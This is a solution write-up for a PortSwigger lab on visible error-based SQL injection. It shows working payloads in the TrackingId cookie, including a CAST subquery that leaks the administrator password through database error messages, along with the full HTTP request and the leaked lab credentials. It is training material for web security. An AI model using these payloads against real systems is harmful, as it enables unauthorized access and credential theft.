# PortSwigger Lab: Visible error-based SQL injection

## Lab Description
This lab contains a SQL injection vulnerability in the tracking cookie used for analytics. The application performs a SQL query containing the value of the submitted cookie. While the results of the query are not returned, the database is configured to display verbose error messages, which can be exploited to leak sensitive data.

## Objective
Leak the password for the `administrator` user from the `users` table and log in to solve the lab.

## Vulnerability Analysis
- **Injection Point:** `TrackingId` cookie.
- **Vulnerability Type:** Error-based SQL Injection.
- **Database Type:** Likely PostgreSQL (indicated by `CAST` and `LIMIT` syntax).
- **Mechanism:** The application reflects database error messages in the HTTP response. By intentionally causing a type conversion error (e.g., casting a string to an integer), we can force the database to include the results of a subquery in the error message.

## Exploitation Steps

### 1. Triggering an Error
Adding a single quote (`'`) to the `TrackingId` cookie reveals a verbose error message showing the full query:
```sql
SELECT * FROM tracking WHERE id = 'ogAZZfxtOKUELbuJ''
```
The error confirms we have an unclosed string literal.

### 2. Validating the Injection
We use a comment (`--`) to fix the syntax:
`TrackingId=xyz'--`

### 3. Error-Based Extraction Payload
We use the `CAST()` function to force a type conversion error. By attempting to cast the result of a `SELECT` statement to an `integer`, the database will throw an error containing the value of that result.

**Payload Template:**
`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

*Note: The original cookie value should be removed to stay within character limits.*

### 4. Extracting the Administrator Password
**Request:**
```http
GET / HTTP/1.1
Host: [YOUR-LAB-ID].web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Response (Snippet):**
```html
<h4>ERROR: invalid input syntax for type integer: "xf1ylzokwslkiyf1ta73"</h4>
```

The password for the `administrator` user is: **`xf1ylzokwslkiyf1ta73`**

## Final Solution
1. Navigate to the `/login` page.
2. Use the credentials:
   - **Username:** `administrator`
   - **Password:** `xf1ylzokwslkiyf1ta73`
3. Ensure you have a valid CSRF token by refreshing the login page before submitting.

---
*Write-up generated for educational purposes.*
